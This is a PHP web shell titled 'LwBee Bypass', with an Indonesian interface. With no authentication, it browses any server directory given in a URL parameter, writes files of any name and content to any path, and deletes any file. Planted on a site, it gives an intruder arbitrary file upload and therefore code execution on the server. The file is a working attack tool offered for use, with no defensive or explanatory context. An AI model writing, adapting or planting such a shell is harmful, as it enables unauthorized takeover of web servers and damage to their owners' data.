<?php
function scanDirectory($path) {
    $items = [];
    
    if (is_dir($path)) {
        $scan = scandir($path);
        
        foreach ($scan as $item) {
            if ($item !== '.' && $item !== '..') {
                $fullPath = $path . DIRECTORY_SEPARATOR . $item;
                $items[] = [
                    'name' => $item,
                    'path' => $fullPath,
                    'type' => is_dir($fullPath) ? 'directory' : 'file'
                ];
            }
        }
    }
    
    usort($items, function($a, $b) {
        if ($a['type'] === 'directory' && $b['type'] !== 'directory') return -1;
        if ($a['type'] !== 'directory' && $b['type'] === 'directory') return 1;
        if ($a['type'] === 'file' && $b['type'] === 'file') {
            if (strpos($a['name'], '.') === 0 && strpos($b['name'], '.') !== 0) return -1;
            if (strpos($a['name'], '.') !== 0 && strpos($b['name'], '.') === 0) return 1;
        }
        return strcasecmp($a['name'], $b['name']);
    });
    
    return $items;
}

function generateBreadcrumb($path) {
    $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR));
    $breadcrumb = [];
    $currentPath = '';
    foreach ($parts as $part) {
        $currentPath .= DIRECTORY_SEPARATOR . $part;
        $breadcrumb[] = '<a href="?path=' . urlencode($currentPath) . '">' . htmlspecialchars($part) . '</a>';
    }
    return implode(' / ', $breadcrumb);
}

$defaultRootPath = getcwd();
$rootPath = $_GET['path'] ?? $defaultRootPath;

if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['delete_path'])) {
    $deletePath = $_POST['delete_path'];
    if (file_exists($deletePath)) {
        unlink($deletePath);
        echo "<div class='alert alert-success'>File berhasil dihapus: <strong>" . htmlspecialchars($deletePath) . "</strong></div>";
    } else {
        echo "<div class='alert alert-danger'>File tidak ditemukan atau tidak dapat dihapus.</div>";
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $path = $_POST['path'] ?? $rootPath;
    $filename = $_POST['filename'] ?? '';
    $content = $_POST['content'] ?? '';
    
    if (!empty($path) && !empty($filename)) {
        $filePath = rtrim($path, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $filename;
        file_put_contents($filePath, $content);
        echo "<div class='alert alert-success'>File berhasil dibuat di: <strong>" . htmlspecialchars($filePath) . "</strong></div>";
    } else {
        echo "<div class='alert alert-danger'>Path dan nama file tidak boleh kosong.</div>";
    }
}

$scannedItems = scanDirectory($rootPath);
?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LwBee - Create & Delete</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f4f4f9;
            color: #333;
            max-width: 1000px;
            margin: 20px auto;
            padding: 20px;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            background-color: #fff;
        }
		.alert {
            padding: 15px;
            margin-bottom: 20px;
            border: 1px solid transparent;
            border-radius: 4px;
        }
        .alert-success {
            color: #155724;
            background-color: #d4edda;
            border-color: #c3e6cb;
        }
        .alert-danger {
            color: #721c24;
            background-color: #f8d7da;
            border-color: #f5c6cb;
        }
        .alert-warning {
            color: #856404;
            background-color: #fff3cd;
            border-color: #ffeeba;
        }
        h1, h2 {
            text-align: center;
        }
        .form-create {
            background-color: transparent;
            padding: 20px;

        }
        input[type="text"], textarea {
            width: 100%;
            padding: 10px;
            margin: 10px auto;
            border: 1px solid #ccc;
            border-radius: 4px;
        }
        textarea {
            resize: none;
            height: 100px;
        }
        .button-create {
            background-color: #007BFF;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .button:hover {
            background-color: #0056b3;
        }
        .file-manager {
            display: flex;
            flex-direction: column;
        }
        .breadcrumb {
            margin-bottom: 20px;
            font-size: 16px;
        }
        .breadcrumb a {
            text-decoration: none;
            color: #007BFF;
        }
        .breadcrumb a:hover {
            text-decoration: underline;
        }
        ul.file-list {
            list-style: none;
            padding: 0;
        }
        ul.file-list li {
            padding: 10px 20px;
            border-bottom: 1px solid #ddd;
            display: flex;
            justify-content: space-between;
            align-items: right;
			padding-left: 2px;
        }
        ul.file-list li:last-child {
            border-bottom: none;
        }
		.file-info {
            display: flex;
            align-items: center;
            flex: 1;
        }
        .file-info strong {
            margin-right: 10px;
        }
        ul.file-list a {
            text-decoration: none;
            color: #333;
        }
        ul.file-list a:hover {
            color: #007BFF;
        }
        .delete-button {
            background-color: #ff4d4d;
            color: #fff;
            padding: 5px 10px;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        .delete-button:hover {
            background-color: #cc0000;
        }
    </style>
</head>
<body>

<h1>LwBee Bypass</h1>
<hr>
<div class="form-create">
<form action="" method="post">
    <label for="path">Path:</label>
    <input type="text" id="path" name="path" value="<?php echo htmlspecialchars($rootPath); ?>" required>
    <br><br>

    <label for="filename">Nama File:</label>
    <input type="text" id="filename" name="filename" placeholder="contoh.txt" required>
    <br><br>

    <label for="content">Isi File:</label>
    <textarea id="content" name="content" placeholder="Masukkan isi file di sini..."></textarea>
    <br><br>

    <button type="submit" class="button-create">Buat File</button>
</form>
</div>
<br>
<div class="breadcrumb">
    <strong>Path:</strong> <?php echo generateBreadcrumb($rootPath); ?>
</div>
<ul class="file-list">
    <?php foreach ($scannedItems as $item): ?>
        <li>
		<div class="file-info">
            <strong><?php echo $item['type'] === 'directory' ? '[Dir]' : '[File]'; ?></strong>
            <a href="?path=<?php echo urlencode($item['path']); ?>"><?php echo htmlspecialchars($item['name']); ?></a>
            <form action="" method="post" style="margin: 0;">
		</div>
                <input type="hidden" name="delete_path" value="<?php echo htmlspecialchars($item['path']); ?>">
                <button type="submit" class="delete-button">Hapus</button>
            </form>
        </li>
    <?php endforeach; ?>
</ul>

</body>
</html>
